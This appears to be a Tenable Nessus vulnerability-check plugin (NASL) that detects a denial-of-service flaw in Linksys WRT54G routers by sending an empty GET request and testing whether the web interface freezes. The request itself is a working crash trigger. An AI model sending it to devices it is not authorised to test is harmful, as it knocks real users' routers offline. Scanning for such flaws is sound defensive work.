#
# (C) Tenable Network Security, Inc.
# 
# References:
# http://www.nessus.org/u?6629f502
#
# I wonder if this script is useful: the router is probably already dead.
# 


include("compat.inc");

if(description)
{
 script_id(11941);
 script_xref(name:"OSVDB", value:"51489");
 script_version ("$Revision: 1.9 $");
 
 script_name(english:"Linksys WRT54G Empty GET Request Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service 
vulnerability.");

 script_set_attribute(attribute:"description", value:
"It is possible to freeze the remote web server by sending an empty 
GET request. This is known to affect Linksys WRT54G routers." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6629f502" );
 script_set_attribute(attribute:"solution", value:
"Upgrade your firmware." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 summary["english"] = "Empty GET request freezes Linksys WRT54G HTTP interface";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"CISCO");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if ( ! port ) exit(0);

req = 'GET\r\n';
send(socket:soc, data: req);
http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port, retry: 3)) security_warning(port);
